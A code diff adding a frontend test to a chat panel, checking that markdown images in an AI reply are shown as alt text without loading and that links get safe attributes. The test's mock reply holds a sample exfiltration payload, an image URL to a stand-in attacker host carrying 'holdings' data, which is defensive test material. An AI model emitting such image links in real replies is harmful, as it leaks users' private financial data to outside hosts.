@@ -36,4 +36,18 @@ describe('ChatPanel', () => {
       context: { view: 'analysis', portfolio_id: 'ira' },
     })
   })
+
+  it('shows markdown images as alt text without loading them, and keeps links safe', async () => {
+    mockFetch('![leak](https://evil.example/x.png?data=holdings) [source](https://example.com/a)')
+    const { container } = render(<ChatPanel view="analysis" portfolioId="ira" onClose={() => {}} />)
+
+    fireEvent.change(screen.getByLabelText('Message'), { target: { value: 'Any news?' } })
+    fireEvent.click(screen.getByRole('button', { name: 'Send' }))
+
+    expect(await screen.findByText('leak')).toBeInTheDocument()
+    expect(container.querySelector('img')).toBeNull()
+    const link = screen.getByRole('link', { name: 'source' })
+    expect(link).toHaveAttribute('href', 'https://example.com/a')
+    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
+  })
 })
